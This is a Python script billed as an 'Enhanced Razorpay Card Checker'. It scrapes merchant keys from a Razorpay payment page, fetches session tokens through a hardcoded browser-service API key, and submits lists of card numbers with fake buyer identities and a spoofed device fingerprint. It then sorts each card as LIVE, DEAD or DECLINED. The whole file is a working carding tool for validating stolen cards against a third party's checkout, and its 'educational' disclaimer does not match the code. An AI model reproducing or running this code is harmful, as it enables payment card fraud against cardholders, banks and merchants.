import requests
import json
import time
import random
from urllib.parse import urlencode, urlparse, parse_qs
from datetime import datetime
import re
import os
from playwright.sync_api import sync_playwright
from bs4 import BeautifulSoup
import logging
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

DEVICE_FINGERPRINT = "noXc7Zv4NmOzRNIl3zmSernrLMFEo05J0lh73kdY46cUpMIuLjBQbCwQygBbMH4t4xfrCkwWutyony5DncDTRX0e50ULyy2GMgy2LUxAwaxczwLNJYzwLXqTe7GlMxqzCo7XgsfxKEWuy6hRjefIXYKVOJ23KBn6"
BROWSERLESS_API_KEY = "2SnMWeeEB7voHxK22f5ee7ff5e5d665176f02d0b9a566358d"

def get_dynamic_session_token():
    if not BROWSERLESS_API_KEY or BROWSERLESS_API_KEY == "YOUR_API_KEY_HERE":
        return None, "Browserless.io API Key not set."

    browser_ws_endpoint = f'wss://production-sfo.browserless.io?token={BROWSERLESS_API_KEY}&timeout=60000'
    try:
        with sync_playwright() as p:
            browser = p.chromium.connect_over_cdp(browser_ws_endpoint, timeout=60000)
            page = browser.new_page()
            initial_url = "https://api.razorpay.com/v1/checkout/public?traffic_env=production&new_session=1"
            page.goto(initial_url, timeout=30000)
            page.wait_for_url("**/checkout/public*session_token*", timeout=25000)
            final_url = page.url
            browser.close()

            session_token = parse_qs(urlparse(final_url).query).get("session_token", [None])[0]
            return (session_token, None) if session_token else (None, "Token not found in URL.")
    except Exception as e:
        return None, f"Playwright (session token) error: {e}"

def handle_redirect_and_get_result(redirect_url):
    if not BROWSERLESS_API_KEY or BROWSERLESS_API_KEY == "YOUR_API_KEY_HERE":
        return "Browserless.io API Key not set."

    browser_ws_endpoint = f'wss://production-sfo.browserless.io?token={BROWSERLESS_API_KEY}&timeout=60000'
    try:
        with sync_playwright() as p:
            browser = p.chromium.connect_over_cdp(browser_ws_endpoint, timeout=60000)
            page = browser.new_page()
            page.goto(redirect_url, timeout=45000, wait_until='networkidle')

            body_locator = page.locator("body")
            body_locator.wait_for(timeout=10000)
            full_status_text = body_locator.inner_text()

            browser.close()
            return " ".join(full_status_text.split())
    except Exception as e:
        return f"Playwright (redirect) error: {e}"

def extract_merchant_data_with_playwright(site_url):
    if not BROWSERLESS_API_KEY or BROWSERLESS_API_KEY == "YOUR_API_KEY_HERE":
        return None, None, None, None, "Browserless.io API Key not set."

    browser_ws_endpoint = f'wss://production-sfo.browserless.io?token={BROWSERLESS_API_KEY}&timeout=60000'
    try:
        with sync_playwright() as p:
            browser = p.chromium.connect_over_cdp(browser_ws_endpoint, timeout=60000)
            page = browser.new_page()

            captured_data = {}

            def handle_response(response):
                try:
                    if 'razorpay' in response.url and response.status == 200:
                        content_type = response.headers.get('content-type', '')
                        if 'application/json' in content_type:
                            try:
                                data = response.json()
                                if isinstance(data, dict):
                                    if 'key_id' in data:
                                        captured_data['key_id'] = data['key_id']
                                    if 'keyless_header' in data:
                                        captured_data['keyless_header'] = data['keyless_header']
                                    if 'data' in data and isinstance(data['data'], dict):
                                        for key, value in data['data'].items():
                                            if key in ['key_id', 'keyless_header', 'payment_link', 'payment_page_items']:
                                                captured_data[key] = value
                                logger.info(f"[DEBUG] Captured API response from {response.url}: {list(data.keys())}")
                            except:
                                pass
                except Exception as e:
                    logger.debug(f"Error handling response: {e}")

            page.on('response', handle_response)

            page.goto(site_url, timeout=45000, wait_until='networkidle')

            page.wait_for_timeout(8000)

            try:
                page.evaluate("window.scrollTo(0, document.body.scrollHeight)")
                page.wait_for_timeout(2000)
            except:
                pass

            page_html = page.content()

            try:
                js_data = page.evaluate("""
                    () => {
                        const results = {};

                        for (let prop in window) {
                            try {
                                if (typeof window[prop] === 'object' && window[prop] !== null) {
                                    const obj = window[prop];
                                    if (obj.key_id || obj.keyless_header || obj.payment_link) {
                                        Object.assign(results, obj);
                                    }
                                }
                            } catch(e) {}
                        }

                        if (typeof data !== 'undefined') Object.assign(results, data);
                        if (typeof razorpayData !== 'undefined') Object.assign(results, razorpayData);
                        if (typeof checkout_data !== 'undefined') Object.assign(results, checkout_data);
                        if (typeof window.data !== 'undefined') Object.assign(results, window.data);
                        if (typeof window.razorpay !== 'undefined') Object.assign(results, window.razorpay);

                        const scripts = document.querySelectorAll('script');
                        for (let script of scripts) {
                            if (script.textContent) {
                                const text = script.textContent;

                                const keyIdMatches = [
                                    /["']key_id["']\s*:\s*["']([^"']+)["']/g,
                                    /key_id["']\s*:\s*["']([^"']+)["']/g,
                                    /rzp_[a-z]*_([A-Za-z0-9]{14})/g
                                ];

                                for (let pattern of keyIdMatches) {
                                    let match;
                                    while ((match = pattern.exec(text)) !== null) {
                                        if (match[1] && match[1].length >= 10) {
                                            results.key_id = match[1];
                                            break;
                                        }
                                    }
                                    if (results.key_id) break;
                                }

                                try {
                                    const jsonMatches = text.match(/\{[^{}]*["'](?:key_id|keyless_header|payment_link)["'][^{}]*\}/g);
                                    if (jsonMatches) {
                                        for (let jsonStr of jsonMatches) {
                                            try {
                                                const parsed = JSON.parse(jsonStr);
                                                if (parsed.key_id || parsed.keyless_header) {
                                                    Object.assign(results, parsed);
                                                }
                                            } catch(e) {}
                                        }
                                    }
                                } catch(e) {}
                            }
                        }

                        if (typeof Razorpay !== 'undefined' && Razorpay.config) {
                            Object.assign(results, Razorpay.config);
                        }

                        const elementsWithData = document.querySelectorAll('[data-key-id], [data-keyless-header], [data-payment-link]');
                        for (let elem of elementsWithData) {
                            if (elem.dataset.keyId) results.key_id = elem.dataset.keyId;
                            if (elem.dataset.keylessHeader) results.keyless_header = elem.dataset.keylessHeader;
                            if (elem.dataset.paymentLink) results.payment_link = elem.dataset.paymentLink;
                        }

                        return results;
                    }
                """)

                if captured_data:
                    if not js_data:
                        js_data = {}
                    js_data.update(captured_data)

                if js_data and isinstance(js_data, dict) and js_data:
                    logger.info("[DEBUG] Successfully extracted data via enhanced JavaScript execution")
                    logger.info(f"[DEBUG] Extracted fields: {list(js_data.keys())}")

                    keyless_header = js_data.get("keyless_header")
                    key_id = js_data.get("key_id")

                    payment_link = js_data.get("payment_link", {})
                    if isinstance(payment_link, str):
                        payment_link_id = payment_link
                    else:
                        payment_link_id = payment_link.get("id") if payment_link else None

                    payment_page_items = payment_link.get("payment_page_items", []) if isinstance(payment_link, dict) else []
                    payment_page_item_id = payment_page_items[0].get("id") if payment_page_items else None

                    if not payment_page_item_id:
                        payment_page_item_id = js_data.get("payment_page_item_id")

                    logger.info(f"[DEBUG] key_id: {bool(key_id)}, keyless_header: {bool(keyless_header)}, payment_link_id: {bool(payment_link_id)}, payment_page_item_id: {bool(payment_page_item_id)}")

                    if key_id or keyless_header or payment_link_id:
                        browser.close()
                        return keyless_header, key_id, payment_link_id, payment_page_item_id, None

            except Exception as e:
                logger.warning(f"Enhanced JavaScript execution failed: {e}")

            browser.close()

        return extract_data_from_html(page_html)
    except Exception as e:
        return None, None, None, None, f"Playwright error: {e}"

def extract_data_from_html(page_html):
    soup = BeautifulSoup(page_html, 'html.parser')
    scripts = soup.find_all('script')

    key_id_patterns = [
        r'"key_id"\s*:\s*"([^"]+)"',
        r"'key_id'\s*:\s*'([^']+)'",
        r'key_id["\s]*:\s*["\']([^"\']+)["\']',
        r'rzp_[a-z]*_([A-Za-z0-9]{14})',
        r'data-key-id=["\']([^"\']+)["\']',
        r'keyId["\']?\s*[:=]\s*["\']([^"\']+)["\']',
        r'RAZORPAY_KEY_ID["\']?\s*[:=]\s*["\']([^"\']+)["\']',
        r'razorpay[._]key[._]id["\']?\s*[:=]\s*["\']([^"\']+)["\']',
        r'public[._]key["\']?\s*[:=]\s*["\']([^"\']+)["\']',
        r'merchant[._]key["\']?\s*[:=]\s*["\']([^"\']+)["\']',
    ]

    data_patterns = [
        r'(?:var|let|const|window\.)\s*data\s*=\s*(\{.*?\});',
        r'window\["data"\]\s*=\s*(\{.*?\});',
        r'"data"\s*:\s*(\{.*?\})',
        r'data\s*:\s*(\{.*?\})',
        r'razorpay_data\s*=\s*(\{.*?\});',
        r'payment_data\s*=\s*(\{.*?\});',
        r'checkout_data\s*=\s*(\{.*?\});',
        r'window\.razorpay\s*=\s*(\{.*?\});',
        r'Razorpay\s*\(\s*(\{.*?\})\s*\)',
    ]

    for script in scripts:
        if not script.string:
            continue

        script_content = script.string.strip()

        for pattern in data_patterns:
            matches = re.finditer(pattern, script_content, re.DOTALL | re.IGNORECASE)
            for match in matches:
                try:
                    json_str = match.group(1)
                    json_str = re.sub(r',\s*}', '}', json_str)
                    json_str = re.sub(r',\s*]', ']', json_str)

                    data = json.loads(json_str)
                    if isinstance(data, dict):
                        result = extract_fields_from_data(data)
                        if result[1] is None:
                            logger.info(f"[DEBUG] Found data using pattern: {pattern}")
                            return result
                except (json.JSONDecodeError, AttributeError):
                    continue

    full_html = str(soup)

    field_patterns = {
        'keyless_header': [
            r'"keyless_header"\s*:\s*"([^"]+)"',
            r"'keyless_header'\s*:\s*'([^']+)'",
            r'keyless_header["\s]*:\s*["\']([^"\']+)["\']',
            r'data-keyless-header=["\']([^"\']+)["\']',
        ],
        'key_id': key_id_patterns,
        'payment_link_id': [
            r'"payment_link"[^}]*"id"\s*:\s*"([^"]+)"',
            r"'payment_link'[^}]*'id'\s*:\s*'([^']+)'",
            r'plink_[A-Za-z0-9]{14}',
            r'data-payment-link-id=["\']([^"\']+)["\']',
            r'payment[._]link[._]id["\']?\s*[:=]\s*["\']([^"\']+)["\']',
        ],
        'payment_page_item_id': [
            r'"payment_page_items"[^}]*"id"\s*:\s*"([^"]+)"',
            r"'payment_page_items'[^}]*'id'\s*:\s*'([^']+)'",
            r'ppi_[A-Za-z0-9]{14}',
            r'data-payment-page-item-id=["\']([^"\']+)["\']',
            r'payment[._]page[._]item[._]id["\']?\s*[:=]\s*["\']([^"\']+)["\']',
        ]
    }

    extracted_fields = {}
    for field_name, patterns in field_patterns.items():
        for pattern in patterns:
            match = re.search(pattern, full_html, re.IGNORECASE | re.DOTALL)
            if match:
                value = match.group(1)
                if field_name == 'key_id':
                    if len(value) >= 10 and (value.startswith('rzp_') or len(value) >= 14):
                        extracted_fields[field_name] = value
                        logger.info(f"[DEBUG] Found {field_name} using regex: {pattern[:50]}...")
                        break
                else:
                    extracted_fields[field_name] = value
                    logger.info(f"[DEBUG] Found {field_name} using regex: {pattern[:50]}...")
                    break

    meta_patterns = {
        'keyless_header': ['keyless-header', 'rzp-keyless-header', 'razorpay-keyless-header'],
        'key_id': ['key-id', 'rzp-key-id', 'razorpay-key', 'razorpay-key-id', 'public-key'],
        'payment_link_id': ['payment-link-id', 'plink-id', 'razorpay-payment-link'],
        'payment_page_item_id': ['payment-page-item-id', 'ppi-id', 'razorpay-item-id']
    }

    for field_name, attr_names in meta_patterns.items():
        if field_name not in extracted_fields:
            for attr_name in attr_names:
                meta_tag = soup.find('meta', attrs={'name': attr_name})
                if meta_tag and meta_tag.get('content'):
                    extracted_fields[field_name] = meta_tag['content']
                    logger.info(f"[DEBUG] Found {field_name} in meta tag")
                    break

                data_elem = soup.find(attrs={f'data-{attr_name}': True})
                if data_elem:
                    extracted_fields[field_name] = data_elem[f'data-{attr_name}']
                    logger.info(f"[DEBUG] Found {field_name} in data attribute")
                    break

                input_tag = soup.find('input', attrs={'name': attr_name, 'type': 'hidden'})
                if input_tag and input_tag.get('value'):
                    extracted_fields[field_name] = input_tag['value']
                    logger.info(f"[DEBUG] Found {field_name} in hidden input")
                    break

    if 'key_id' not in extracted_fields:
        razorpay_init_patterns = [
            r'new\s+Razorpay\s*\(\s*\{\s*[^}]*key\s*:\s*["\']([^"\']+)["\']',
            r'Razorpay\s*\(\s*\{\s*[^}]*key\s*:\s*["\']([^"\']+)["\']',
            r'rzp\s*=\s*new\s+Razorpay\s*\(\s*\{\s*[^}]*key\s*:\s*["\']([^"\']+)["\']',
        ]

        for pattern in razorpay_init_patterns:
            match = re.search(pattern, full_html, re.IGNORECASE | re.DOTALL)
            if match:
                key_value = match.group(1)
                if len(key_value) >= 10:
                    extracted_fields['key_id'] = key_value
                    logger.info(f"[DEBUG] Found key_id in Razorpay initialization")
                    break

    required_fields = ['key_id']
    missing_critical = [f for f in required_fields if f not in extracted_fields or not extracted_fields[f]]

    if missing_critical:
        if 'key_id' not in extracted_fields:
            rzp_key_match = re.search(r'(rzp_[a-z]*_[A-Za-z0-9]{14,})', full_html)
            if rzp_key_match:
                extracted_fields['key_id'] = rzp_key_match.group(1)
                logger.info(f"[DEBUG] Found key_id via rzp pattern: {extracted_fields['key_id']}")
                missing_critical.remove('key_id')

    missing_fields = [f for f in ['keyless_header', 'key_id', 'payment_link_id', 'payment_page_item_id'] 
                     if f not in extracted_fields or not extracted_fields[f]]

    if missing_fields:
        logger.warning(f"[DEBUG] Missing fields: {missing_fields}")
        if 'key_id' in extracted_fields:
            logger.info("[DEBUG] Proceeding with partial data since key_id is available")
        else:
            return None, None, None, None, f"Missing critical field: key_id (and others: {', '.join(missing_fields)})"

    return (extracted_fields.get('keyless_header'), 
            extracted_fields.get('key_id'),
            extracted_fields.get('payment_link_id'), 
            extracted_fields.get('payment_page_item_id'), 
            None)

def extract_fields_from_data(data):
    try:
        keyless_header = data.get("keyless_header")
        key_id = data.get("key_id")

        if not key_id:
            alt_key_names = ['public_key', 'publishable_key', 'razorpay_key', 'merchant_key', 'api_key']
            for alt_name in alt_key_names:
                if alt_name in data and data[alt_name]:
                    key_id = data[alt_name]
                    logger.info(f"[DEBUG] Found key_id using alternative name: {alt_name}")
                    break

        payment_link = data.get("payment_link", {})
        payment_link_id = payment_link.get("id") if isinstance(payment_link, dict) else None

        payment_page_items = payment_link.get("payment_page_items", []) if isinstance(payment_link, dict) else []
        payment_page_item_id = payment_page_items[0].get("id") if payment_page_items else None

        logger.info(f"[DEBUG] Extracted fields - keyless_header: {bool(keyless_header)}, key_id: {bool(key_id)}, payment_link_id: {bool(payment_link_id)}, payment_page_item_id: {bool(payment_page_item_id)}")

        missing_fields = []
        if not key_id:
            missing_fields.append("key_id")
        if not keyless_header:
            missing_fields.append("keyless_header")
        if not payment_link_id:
            missing_fields.append("payment_link_id")
        if not payment_page_item_id:
            missing_fields.append("payment_page_item_id")

        if not key_id:
            return None, None, None, None, f"Missing critical field: key_id"
        elif missing_fields and len(missing_fields) > 2:
            return None, None, None, None, f"Missing required fields: {', '.join(missing_fields)}"

        return keyless_header, key_id, payment_link_id, payment_page_item_id, None
    except Exception as e:
        return None, None, None, None, f"Error extracting fields from data: {e}"

def random_user_info():
    names = ["Alex Johnson", "Sarah Wilson", "Mike Brown", "Emma Davis", "John Smith", "Lisa Garcia", "Chris Taylor", "Ashley Martinez", "David Anderson", "Jennifer Thomas"]
    domains = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com", "protonmail.com"]

    return {
        "name": random.choice(names),
        "email": f"test{random.randint(1000,9999)}@{random.choice(domains)}",
        "phone": f"98765{random.randint(10000,99999)}"
    }

def fetch_bin_info(bin6):
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}

    services = [
        f"https://lookup.binlist.net/{bin6}",
        f"https://api.binlist.io/{bin6}",
    ]

    for service_url in services:
        try:
            res = requests.get(service_url, headers=headers, timeout=8)
            if res.status_code == 200:
                data = res.json()
                bank = data.get("bank", {}).get("name", "Unknown") if isinstance(data.get("bank"), dict) else "Unknown"
                scheme = data.get("scheme", "Unknown").upper()
                card_type = data.get("type", "Unknown").upper()
                country = data.get("country", {}).get("name", "Unknown") if isinstance(data.get("country"), dict) else "Unknown"
                return bank, f"{scheme}/{card_type}", country
        except Exception as e:
            logger.debug(f"BIN lookup failed for {service_url}: {e}")
            continue

    return "Unknown", "Unknown", "Unknown"

def create_order(session, payment_link_id, amount_paise, payment_page_item_id):
    if not payment_link_id:
        logger.error("Cannot create order: payment_link_id is missing")
        return None

    url = f"https://api.razorpay.com/v1/payment_pages/{payment_link_id}/order"
    headers = {
        "Accept": "application/json",
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    }

    line_items = []
    if payment_page_item_id:
        line_items.append({
            "payment_page_item_id": payment_page_item_id,
            "amount": amount_paise
        })
    else:
        line_items.append({
            "amount": amount_paise,
            "quantity": 1
        })

    payload = {
        "notes": {"comment": ""},
        "line_items": line_items
    }

    for attempt in range(3):
        try:
            resp = session.post(url, headers=headers, json=payload, timeout=20)
            if resp.status_code == 200:
                order_data = resp.json()
                order_id = order_data.get("order", {}).get("id")
                if order_id:
                    return order_id
                else:
                    logger.warning(f"Order created but no ID found: {order_data}")
            else:
                logger.warning(f"Order creation failed with status {resp.status_code}: {resp.text}")

        except Exception as e:
            logger.error(f"Order creation attempt {attempt + 1} failed: {e}")
            if attempt < 2:
                time.sleep(2)

    return None

def submit_payment(session, order_id, card_info, user_info, amount_paise, key_id, keyless_header, payment_link_id, session_token, site_url):
    card_number, exp_month, exp_year, cvv = card_info

    url = "https://api.razorpay.com/v1/standard_checkout/payments/create/ajax"
    params = {
        "key_id": key_id,
        "keyless_header": keyless_header or "default_header"
    }

    if session_token:
        params["session_token"] = session_token

    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "application/json",
        "Origin": "https://api.razorpay.com",
        "Referer": site_url
    }

    if session_token:
        headers["x-session-token"] = session_token

    data = {
        "notes[comment]": "",
        "key_id": key_id,
        "callback_url": site_url,
        "contact": f"+91{user_info['phone']}",
        "email": user_info["email"],
        "currency": "INR",
        "_[library]": "checkoutjs",
        "_[platform]": "browser",
        "_[referer]": site_url,
        "amount": amount_paise,
        "device_fingerprint[fingerprint_payload]": DEVICE_FINGERPRINT,
        "method": "card",
        "card[number]": card_number,
        "card[cvv]": cvv,
        "card[name]": user_info["name"],
        "card[expiry_month]": exp_month,
        "card[expiry_year]": exp_year,
        "save": "0"
    }

    if payment_link_id:
        data["payment_link_id"] = payment_link_id
    if order_id:
        data["order_id"] = order_id

    try:
        response = session.post(url, headers=headers, params=params, data=urlencode(data), timeout=25)
        return response
    except Exception as e:
        logger.error(f"Payment submission failed: {e}")
        raise

def analyze_response(response_data, card_number):
    try:
        if isinstance(response_data, str):
            response_data = json.loads(response_data)
    except:
        pass

    cc_last4 = card_number[-4:]

    if response_data.get("redirect") or response_data.get("success"):
        return f"✅ [LIVE] Card processed successfully - may require 3DS", "LIVE"

    if "error" in response_data:
        error = response_data["error"]
        error_code = error.get("code", "").lower()
        error_desc = error.get("description", "").lower()
        error_reason = error.get("reason", "").lower()

        if any(keyword in error_desc for keyword in ["insufficient", "balance", "limit", "amount"]):
            return f"💳 [LIVE] Insufficient funds/limit - {error_desc}", "LIVE"
        elif any(keyword in error_desc for keyword in ["expired", "expiry", "invalid expiry"]):
            return f"⏰ [EXPIRED] Card expired - {error_desc}", "EXPIRED"
        elif any(keyword in error_desc for keyword in ["invalid", "incorrect", "wrong", "malformed"]):
            return f"❌ [DEAD] Invalid card details - {error_desc}", "DEAD"
        elif any(keyword in error_desc for keyword in ["declined", "not authorized", "authorization failed"]):
            return f"🚫 [DECLINED] Bank declined - {error_desc}", "DECLINED"
        elif any(keyword in error_desc for keyword in ["risk", "fraud", "blocked", "restricted"]):
            return f"⚠️ [RISK] Risk/fraud check failed - {error_desc}", "RISK"
        elif any(keyword in error_desc for keyword in ["cvv", "cvc", "security code"]):
            return f"🔐 [LIVE] CVV mismatch - {error_desc}", "LIVE"
        elif any(keyword in error_desc for keyword in ["network", "issuer", "processor"]):
            return f"📡 [NETWORK] Network/processor error - {error_desc}", "NETWORK"
        else:
            return f"❓ [UNKNOWN] {error_desc}", "UNKNOWN"

    if response_data.get("status") == "failed":
        failure_reason = response_data.get("failure_reason", "Unknown failure")
        return f"❌ [DEAD] Payment failed - {failure_reason}", "DEAD"

    return f"❓ [UNKNOWN] Unexpected response format", "UNKNOWN"

def print_card_result(index, total, card_line, status_message, status_category, bank, scheme, country, duration):
    card_number = card_line.split('|')[0]
    masked_card = f"{card_number[:6]}******{card_number[-4:]}"

    status_colors = {
        "LIVE": "🟢",
        "EXPIRED": "🟡", 
        "DECLINED": "🔴",
        "DEAD": "⚫",
        "RISK": "🟠",
        "NETWORK": "🔵",
        "UNKNOWN": "⚪"
    }

    color = status_colors.get(status_category, "⚪")

    print(f"\n{color} [{index+1}/{total}] Card: {masked_card}")
    print(f"   Status: {status_message}")
    print(f"   Info: {scheme} | {bank} | {country}")
    print(f"   Time: {duration}s")

    with open("results.txt", "a", encoding="utf-8") as f:
        f.write(f"{card_line} | {status_message} | {scheme} | {bank} | {country} | {duration}s\n")

def process_single_card(card_line, session_token, keyless_header, key_id, payment_link_id, payment_page_item_id, amount_paise, site_url, index, total):
    start_time = time.time()

    try:
        card_number, exp_month, exp_year, cvv = card_line.split('|')
    except ValueError:
        print(f"\n⚠️ [{index+1}/{total}] Invalid card format: {card_line}")
        return

    bank, scheme, country = fetch_bin_info(card_number[:6])

    session = requests.Session()
    order_id = create_order(session, payment_link_id, amount_paise, payment_page_item_id)

    if not order_id:
        print(f"\n💥 [{index+1}/{total}] Failed to create order for: {card_number[-4:]}")
        return

    try:
        response = submit_payment(session, order_id, (card_number, exp_month, exp_year, cvv), 
                                random_user_info(), amount_paise, key_id, keyless_header, 
                                payment_link_id, session_token, site_url)

        response_data = response.json()

        if response_data.get("redirect"):
            redirect_url = response_data.get('request', {}).get('url')
            if redirect_url:
                redirect_result = handle_redirect_and_get_result(redirect_url)
                status_message = f"✅ [3DS] Redirect processed: {redirect_result}"
                status_category = "LIVE"
            else:
                status_message = "✅ [3DS] Redirect required but URL not found"
                status_category = "LIVE"
        else:
            status_message, status_category = analyze_response(response_data, card_number)

    except Exception as e:
        status_message = f"💥 [ERROR] Script error: {str(e)}"
        status_category = "UNKNOWN"

    duration = round(time.time() - start_time, 2)

    print_card_result(index, total, card_line, status_message, status_category, bank, scheme, country, duration)

    return status_category

if __name__ == "__main__":
    print("🚀 --- Enhanced Razorpay Card Checker (v7 - ULTIMATE) ---")
    print("⚡ Multi-method extraction | Better error handling | Detailed analysis | Threading support")
    print("🔧 Use responsibly and only for educational purposes on your own pages.\n")

    site_url = input("Enter the Razorpay Payment Page URL: ").strip()
    amount_str = input("Enter amount to charge (in Rupees, e.g., 1): ").strip()

    threading_choice = input("Enable multi-threading? (y/n, default: n): ").strip().lower()
    max_threads = 1
    if threading_choice == 'y':
        max_threads = int(input("Enter number of threads (1-10, default: 3): ").strip() or "3")
        max_threads = max(1, min(10, max_threads))

    try:
        amount_rupees = int(amount_str)
        if amount_rupees < 1: 
            amount_rupees = 1
    except ValueError:
        amount_rupees = 1

    amount_paise = amount_rupees * 100
    print(f"💰 Charge amount set to ₹{amount_rupees}.")

    cards_file = "cards.txt"
    if not os.path.exists(cards_file):
        print(f"\n❌ [ERROR] File not found: '{cards_file}'. Please create it and add cards.")
        exit()

    with open(cards_file, "r") as f:
        cards = [line.strip() for line in f if line.strip()]

    if not cards:
        print(f"❌ [ERROR] No cards found in {cards_file}.")
        exit()

    print(f"\n📋 [INFO] Loaded {len(cards)} card(s) from {cards_file}.")

    print("🌐 [INFO] Launching browser to extract merchant data...")
    keyless_header, key_id, payment_link_id, payment_page_item_id, error_msg = extract_merchant_data_with_playwright(site_url)

    if error_msg:
        print(f"💥 [FATAL] {error_msg}")
        exit()

    print("✅ [SUCCESS] Merchant data extracted successfully.")
    print(f"🔑 [INFO] Key ID: {key_id[:10] + '...' if key_id and len(key_id) > 10 else key_id}")

    print("🔑 [INFO] Acquiring session token...")
    session_token, error_msg = get_dynamic_session_token()

    if error_msg:
        print(f"⚠️ [WARNING] Session token acquisition failed: {error_msg}")
        print("🔄 [INFO] Proceeding without session token...")
        session_token = None
    else:
        print("✅ [SUCCESS] Session token acquired.")

    with open("results.txt", "w", encoding="utf-8") as f:
        f.write(f"Results for {site_url} - {datetime.now()}\n")
        f.write("="*80 + "\n")

    print("\n" + "="*60)
    print("🎯 --- Starting Enhanced Card Analysis ---")
    if max_threads > 1:
        print(f"🧵 --- Using {max_threads} threads ---")
    print("="*60)

    stats = {"LIVE": 0, "EXPIRED": 0, "DECLINED": 0, "DEAD": 0, "RISK": 0, "NETWORK": 0, "UNKNOWN": 0}

    if max_threads > 1:
        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            futures = []
            for i, card_line in enumerate(cards):
                future = executor.submit(
                    process_single_card, card_line, session_token, keyless_header, 
                    key_id, payment_link_id, payment_page_item_id, amount_paise, 
                    site_url, i, len(cards)
                )
                futures.append(future)

                time.sleep(0.5)

            for future in as_completed(futures):
                try:
                    result = future.result()
                    if result:
                        stats[result] += 1
                except Exception as e:
                    print(f"Thread error: {e}")
                    stats["UNKNOWN"] += 1
    else:
        for i, cc_line in enumerate(cards):
            start_time = time.time()

            try:
                card_number, exp_month, exp_year, cvv = cc_line.split('|')
            except ValueError:
                print(f"\n⚠️ [{i+1}/{len(cards)}] Invalid card format: {cc_line}")
                continue

            bank, scheme, country = fetch_bin_info(card_number[:6])

            session = requests.Session()
            order_id = create_order(session, payment_link_id, amount_paise, payment_page_item_id)

            if not order_id:
                print(f"\n💥 [{i+1}/{len(cards)}] Failed to create order for: {card_number[-4:]}")
                continue

            time.sleep(random.uniform(1, 3))

            try:
                response = submit_payment(session, order_id, (card_number, exp_month, exp_year, cvv), 
                                        random_user_info(), amount_paise, key_id, keyless_header, 
                                        payment_link_id, session_token, site_url)

                response_data = response.json()

                if response_data.get("redirect"):
                    redirect_url = response_data.get('request', {}).get('url')
                    if redirect_url:
                        redirect_result = handle_redirect_and_get_result(redirect_url)
                        status_message = f"✅ [3DS] Redirect processed: {redirect_result}"
                        status_category = "LIVE"
                    else:
                        status_message = "✅ [3DS] Redirect required but URL not found"
                        status_category = "LIVE"
                else:
                    status_message, status_category = analyze_response(response_data, card_number)

            except Exception as e:
                status_message = f"💥 [ERROR] Script error: {str(e)}"
                status_category = "UNKNOWN"

            duration = round(time.time() - start_time, 2)

            stats[status_category] += 1

            print_card_result(i, len(cards), cc_line, status_message, status_category, bank, scheme, country, duration)

            if i < len(cards) - 1:
                time.sleep(random.uniform(2, 4))

    print("\n" + "="*60)
    print("📊 --- Final Statistics ---")
    print("="*60)

    total_processed = sum(stats.values())
    for category, count in stats.items():
        if count > 0:
            percentage = (count / total_processed) * 100 if total_processed > 0 else 0
            print(f"{category}: {count} cards ({percentage:.1f}%)")

    print(f"\n🏁 Total cards processed: {total_processed}")
    print(f"📁 Results saved to: results.txt")
    print("✨ Analysis complete!")